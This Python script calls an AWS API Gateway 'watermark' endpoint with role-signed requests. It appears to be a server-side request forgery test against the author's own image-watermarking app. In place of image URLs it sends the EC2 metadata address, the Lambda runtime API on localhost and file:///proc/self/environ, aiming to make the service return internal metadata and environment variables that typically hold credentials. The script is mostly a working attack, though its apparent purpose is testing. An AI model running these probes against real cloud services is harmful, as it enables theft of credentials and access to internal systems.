import os
import re
import uuid
from typing import Dict, List
from urllib.parse import urlparse

import boto3
import requests
from aws_requests_auth.aws_auth import AWSRequestsAuth

INVOKE_URL_REGEX = r"^[a-z0-9]+\.execute-api\.(?P<region>[a-z]{2}-[a-z]+-\d)\.amazonaws\.com$"

SOURCE_BUCKET_NAME = "carousel-app-appbucketssourceimagesbucketcbdfb98c-1weh10b2l2p4m"
API_GATEWAY_URL = "https://3c8y72vp6f.execute-api.us-east-1.amazonaws.com/api/"
INVOKE_API_ROLE = "arn:aws:iam::146213847915:role/carousel-app-CiCdInvokeApiRole56EA5614-1PJVKR4MUSPFS"

s3_client = boto3.client("s3")
sts_client = boto3.client("sts")


def main():
    aws_auth = get_aws_auth()

    # EC2 Metadata endpoint
    print(watermark_image("http://169.254.169.254/latest/meta-data/", aws_auth))

    # Lambda runtime API
    # https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html
    print(watermark_image("http://localhost:9001/2018-06-01/runtime/invocation/next", aws_auth))

    # The current shell environment of the Lambda function
    print(watermark_image("file:///proc/self/environ", aws_auth))

def get_aws_auth() -> AWSRequestsAuth:
    api_gateway_netloc = urlparse(API_GATEWAY_URL).netloc
    api_gateway_region = re.match(INVOKE_URL_REGEX, api_gateway_netloc)["region"]

    credentials = get_aws_temporary_credentials()

    return AWSRequestsAuth(
        aws_host=api_gateway_netloc,
        aws_region=api_gateway_region,
        aws_service="execute-api",
        aws_access_key=credentials["AccessKeyId"],
        aws_secret_access_key=credentials["SecretAccessKey"],
        aws_token=credentials["SessionToken"],
    )


def get_aws_temporary_credentials() -> Dict:
    return sts_client.assume_role(RoleArn=INVOKE_API_ROLE, RoleSessionName=str(uuid.uuid4()), DurationSeconds=900)["Credentials"]


def watermark_image(image_url: str, auth: AWSRequestsAuth) -> None:
    response = requests.post(url=f"{API_GATEWAY_URL}watermark", json={"url": image_url}, auth=auth)
    return response.json()#["uploaded_image"].split("/")[-1]


if __name__ == "__main__":
    main()
